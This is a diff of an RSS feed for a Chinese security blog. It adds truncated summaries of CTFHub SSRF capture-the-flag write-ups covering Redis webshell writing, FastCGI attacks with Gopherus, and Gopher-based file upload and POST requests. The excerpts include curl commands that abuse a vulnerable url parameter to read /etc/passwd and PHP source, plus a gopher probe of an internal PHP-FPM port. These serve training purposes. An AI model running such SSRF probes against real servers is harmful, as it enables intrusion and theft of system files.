@@ -1,19 +1,77 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
-  <channel>
-    <title>WriteUp on 东阳的安全笔记</title>
-    <link>https://Samantha09.github.io/san-blog/categories/writeup/</link>
-    <description>Recent content in WriteUp on 东阳的安全笔记</description>
-    <generator>Hugo</generator>
-    <language>zh-cn</language>
-    <lastBuildDate>Tue, 09 Jun 2026 22:55:00 +0800</lastBuildDate>
-    <atom:link href="https://Samantha09.github.io/san-blog/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用</title>
-      <link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-file-upload-gopher-tool/</link>
-      <pubDate>Tue, 09 Jun 2026 22:55:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-file-upload-gopher-tool/</guid>
-      <description>&lt;h2 id=&#34;一题目信息&#34;&gt;一、题目信息&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WriteUp on 东阳的个人站点</title><link>https://Samantha09.github.io/san-blog/categories/writeup/</link><description>Recent content in WriteUp on 东阳的个人站点</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Thu, 11 Jun 2026 00:30:00 +0800</lastBuildDate><atom:link href="https://Samantha09.github.io/san-blog/categories/writeup/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFHub SSRF 实战：Redis 协议攻击与 Webshell 写入</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98redis-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E4%B8%8E-webshell-%E5%86%99%E5%85%A5/</link><pubDate>Thu, 11 Jun 2026 00:30:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98redis-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E4%B8%8E-webshell-%E5%86%99%E5%85%A5/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / SSRF&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：SSRF（服务器端请求伪造）、Redis 协议、Gopher 协议、Redis 持久化漏洞、Webshell 写入&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：自写 Python 脚本、cURL、Burp Suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;题目给出一个 &lt;code&gt;?url=&lt;/code&gt; 参数，服务器使用 PHP curl 代为请求用户指定的地址。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://challenge-xxxx.sandbox.ctfhub.com:10800/?url=
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目标是通过 SSRF 攻击内网的 &lt;strong&gt;Redis&lt;/strong&gt; 服务（通常运行在 &lt;code&gt;127.0.0.1:6379&lt;/code&gt;），利用 Redis 的 &lt;code&gt;SAVE&lt;/code&gt; 命令将 Webshell 写入到 Web 根目录，最终实现远程代码执行（RCE）并读取 flag。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="二环境探测与分析"&gt;二、环境探测与分析&lt;/h2&gt;
+&lt;h3 id="21-确认-ssrf-存在"&gt;2.1 确认 SSRF 存在&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -s &lt;span style="color:#e6db74"&gt;&amp;#34;http://target/?url=file:///etc/passwd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回了 &lt;code&gt;/etc/passwd&lt;/code&gt; 内容，确认存在 SSRF。&lt;/p&gt;
+&lt;h3 id="22-读取源码分析"&gt;2.2 读取源码分析&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -s &lt;span style="color:#e6db74"&gt;&amp;#34;http://target/?url=file:///var/www/html/index.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;源码：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;header&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;Location: /?url=_&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;exit&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ch &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;curl_init&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_URL&lt;/span&gt;, $_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_HEADER&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_FOLLOWLOCATION&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_exec&lt;/span&gt;($ch);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_close&lt;/span&gt;($ch);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;</description></item><item><title>CTFHub SSRF 实战：FastCGI 协议攻击与 Gopherus 工具使用</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98fastcgi-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E4%B8%8E-gopherus-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</link><pubDate>Wed, 10 Jun 2026 23:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98fastcgi-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E4%B8%8E-gopherus-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / SSRF&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;考点&lt;/strong&gt;：SSRF（服务器端请求伪造）、FastCGI 协议、Gopher 协议、PHP-FPM 攻击、双重 URL 编码&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：Gopherus、Burp Suite、cURL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;题目给出一个 &lt;code&gt;?url=&lt;/code&gt; 参数，服务器使用 PHP curl 代为请求用户指定的地址。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://challenge-xxxx.sandbox.ctfhub.com:10800/?url=
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目标是通过 SSRF 攻击内网的 &lt;strong&gt;PHP-FPM (FastCGI)&lt;/strong&gt; 服务（通常运行在 &lt;code&gt;127.0.0.1:9000&lt;/code&gt;），实现远程代码执行（RCE），最终读取 flag。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="二环境探测与分析"&gt;二、环境探测与分析&lt;/h2&gt;
+&lt;h3 id="21-确认-ssrf-存在"&gt;2.1 确认 SSRF 存在&lt;/h3&gt;
+&lt;p&gt;首先验证 &lt;code&gt;?url=&lt;/code&gt; 参数是否存在 SSRF：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -s &lt;span style="color:#e6db74"&gt;&amp;#34;http://target/?url=file:///etc/passwd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回了 &lt;code&gt;/etc/passwd&lt;/code&gt; 内容，确认存在 SSRF。&lt;/p&gt;
+&lt;h3 id="22-读取源码分析"&gt;2.2 读取源码分析&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -s &lt;span style="color:#e6db74"&gt;&amp;#34;http://target/?url=file:///var/www/html/index.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;源码如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;header&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;Location: /?url=_&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;exit&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ch &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;curl_init&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_URL&lt;/span&gt;, $_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_HEADER&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style="color:#a6e22e"&gt;CURLOPT_FOLLOWLOCATION&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_exec&lt;/span&gt;($ch);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;curl_close&lt;/span&gt;($ch);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 &lt;code&gt;$_REQUEST['url']&lt;/code&gt; 接收参数，支持 GET/POST&lt;/li&gt;
+&lt;li&gt;使用 &lt;code&gt;curl_exec()&lt;/code&gt; 执行请求，支持多种协议（http/https/ftp/gopher/file 等）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CURLOPT_FOLLOWLOCATION&lt;/code&gt; 开启了跟随重定向&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="23-确认-fastcgi-服务存活"&gt;2.3 确认 FastCGI 服务存活&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -s &lt;span style="color:#e6db74"&gt;&amp;#34;http://target/?url=gopher://127.0.0.1:9000/_test&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回 &lt;code&gt;504 Gateway Time-out&lt;/code&gt;，说明服务器确实尝试连接了 &lt;code&gt;127.0.0.1:9000&lt;/code&gt;，只是 gopher payload 不正确导致 FastCGI 未响应。&lt;/p&gt;</description></item><item><title>CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98gopher-%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8/</link><pubDate>Tue, 09 Jun 2026 22:55:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98gopher-%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / SSRF / 文件上传&lt;/li&gt;
@@ -21,22 +79,22 @@
 &lt;/ul&gt;
 &lt;p&gt;题目场景：存在一个 &lt;code&gt;?url=&lt;/code&gt; 参数，服务器会代为请求用户指定的地址。目标 &lt;code&gt;flag.php&lt;/code&gt; 限制仅本地访问，且需要 POST 上传一个非空文件。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;二源码分析&#34;&gt;二、源码分析&lt;/h2&gt;
+&lt;h2 id="二源码分析"&gt;二、源码分析&lt;/h2&gt;
 &lt;p&gt;通过 Gopher GET 请求访问 &lt;code&gt;flag.php&lt;/code&gt;，拿到源码：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Just View From 127.0.0.1&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CTFHUB&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;关键限制&#34;&gt;关键限制&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Just View From 127.0.0.1&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#34;size&amp;#34;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getenv&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;CTFHUB&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;exit&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="关键限制"&gt;关键限制&lt;/h3&gt;
 &lt;table&gt;
 	&lt;thead&gt;
 			&lt;tr&gt;
@@ -60,18 +118,11 @@
 	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;三攻击思路&#34;&gt;三、攻击思路&lt;/h2&gt;
-&lt;h3 id=&#34;31-绕过本地访问限制&#34;&gt;3.1 绕过本地访问限制&lt;/h3&gt;
+&lt;h2 id="三攻击思路"&gt;三、攻击思路&lt;/h2&gt;
+&lt;h3 id="31-绕过本地访问限制"&gt;3.1 绕过本地访问限制&lt;/h3&gt;
 &lt;p&gt;和之前的 POST key 题型一样，利用 &lt;strong&gt;SSRF&lt;/strong&gt; 让服务器自己请求自己：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;攻击者 -&amp;gt; ?url=gopher://127.0.0.1:80/_... -&amp;gt; 服务器代为请求 -&amp;gt; flag.php
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时 &lt;code&gt;$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]&lt;/code&gt; 就是 &lt;code&gt;127.0.0.1&lt;/code&gt;，通过第一重验证。&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制</title>
-      <link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/</link>
-      <pubDate>Tue, 09 Jun 2026 21:43:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-gopher-post-exploit/</guid>
-      <description>&lt;h2 id=&#34;一题目信息&#34;&gt;一、题目信息&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;攻击者 -&amp;gt; ?url=gopher://127.0.0.1:80/_... -&amp;gt; 服务器代为请求 -&amp;gt; flag.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时 &lt;code&gt;$_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]&lt;/code&gt; 就是 &lt;code&gt;127.0.0.1&lt;/code&gt;，通过第一重验证。&lt;/p&gt;</description></item><item><title>CTFHub SSRF 实战：Gopher 协议构造 POST 请求绕过本地限制</title><link>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98gopher-%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0-post-%E8%AF%B7%E6%B1%82%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E9%99%90%E5%88%B6/</link><pubDate>Tue, 09 Jun 2026 21:43:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/ctfhub-ssrf-%E5%AE%9E%E6%88%98gopher-%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0-post-%E8%AF%B7%E6%B1%82%E7%BB%95%E8%BF%87%E6%9C%AC%E5%9C%B0%E9%99%90%E5%88%B6/</guid><description>&lt;h2 id="一题目信息"&gt;一、题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;平台&lt;/strong&gt;：CTFHub&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;分类&lt;/strong&gt;：Skill / Web / SSRF&lt;/li&gt;
@@ -79,11 +130,11 @@
